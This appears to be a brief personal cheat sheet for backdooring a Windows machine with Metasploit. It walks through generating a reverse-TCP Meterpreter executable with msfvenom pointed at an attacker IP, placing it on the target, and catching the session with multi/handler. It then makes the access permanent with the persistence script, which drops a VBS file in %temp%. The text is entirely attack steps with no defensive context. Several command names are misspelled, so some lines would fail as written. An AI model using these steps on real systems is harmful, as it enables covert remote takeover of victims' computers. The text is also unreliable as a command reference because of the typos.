
 creating the backdoor :

msfvenom -p windows/meterperter/reverse_tcp LHOST=Attacker_IP LPORT=4444 -f exe > shell.exe 

#### we put the shell.exe file in the target machine 


msfconcole 

use expoloit/multi/handler


set payload windows/meterpreter/reverse_tcp 

set LHOST attacker_IP

set LPORT port 

exploit -j -z 


 sessions -i 

sessions -i session_num

shell // sysinfo // 
############ how to make it permanent ########
meterperter> run persistence -U -i 5 -p 4444 -R attacker_IP


it creates ziksdfjsd.vbs in the %temp% folder  // the persistance file 










